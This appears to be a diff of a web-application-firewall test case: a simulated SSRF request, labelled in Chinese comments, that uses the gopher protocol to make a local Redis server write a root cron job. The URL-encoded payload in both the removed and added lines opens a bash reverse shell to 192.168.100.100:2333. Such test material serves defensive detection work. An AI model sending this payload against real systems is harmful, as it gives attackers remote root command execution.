@@ -1,6 +1,6 @@
 # SSRF服务端请求伪造_Gopher协议_redis反弹shell
 # 利用gohper协议结合redis任意文件写入漏洞，写入反弹shell定时计划任务。此攻击为模拟并无实际反弹公网shell操作
-GET /?id=gopher:%2F%2F127.0.0.1:6379%2F_%2A1%250d%250a$8%250d%250aflushall%250d%250a%2A3%250d%250a$3%250d%250aset%250d%250a$1%250d%250a1%250d%250a$64%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E&%20%2Fdev%2Ftcp%2F192.168.100.100%2F2333%200%3E&1%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a$6%250d%250aconfig%250d%250a$3%250d%250aset%250d%250a$3%250d%250adir%250d%250a$16%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a$6%250d%250aconfig%250d%250a$3%250d%250aset%250d%250a$10%250d%250adbfilename%250d%250a$4%250d%250aroot%250d%250a%2A1%250d%250a$4%250d%250asave%250d%250aquit%250d%250a&bid=hd_tag_m8mv24n6 HTTP/1.1
+GET /?id=gopher:%2F%2F127.0.0.1:6379%2F_%2A1%250d%250a$8%250d%250aflushall%250d%250a%2A3%250d%250a$3%250d%250aset%250d%250a$1%250d%250a1%250d%250a$64%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.100%2F2333%200%3E&1%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a$6%250d%250aconfig%250d%250a$3%250d%250aset%250d%250a$3%250d%250adir%250d%250a$16%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a$6%250d%250aconfig%250d%250a$3%250d%250aset%250d%250a$10%250d%250adbfilename%250d%250a$4%250d%250aroot%250d%250a%2A1%250d%250a$4%250d%250asave%250d%250aquit%250d%250a&bid=hd_tag_m8mv24n6 HTTP/1.1
 Host: www.swaf.com
 RM-PRO-BusinessID: hd_tag_m8mv24n6
 RM-PRO-Token: 6d43c29151179a7683c891a6620d3a1b
